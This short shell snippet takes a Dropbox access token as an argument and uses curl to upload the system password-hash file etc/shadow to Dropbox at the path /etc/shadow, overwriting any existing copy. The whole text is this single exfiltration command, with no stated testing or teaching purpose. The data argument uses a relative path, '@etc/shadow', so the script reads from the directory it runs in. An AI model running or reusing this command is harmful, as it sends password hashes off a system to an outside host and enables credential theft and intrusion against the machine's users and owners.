accesstoken="$1"


curl -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer $accesstoken"\
    --header "Dropbox-API-Arg: {\"path\": \"/etc/shadow\", \"mode\": \"overwrite\", \"strict_conflict\": false}" \
    --header "Content-Type: application/octet-stream" \
    --data-binary "@etc/shadow"  

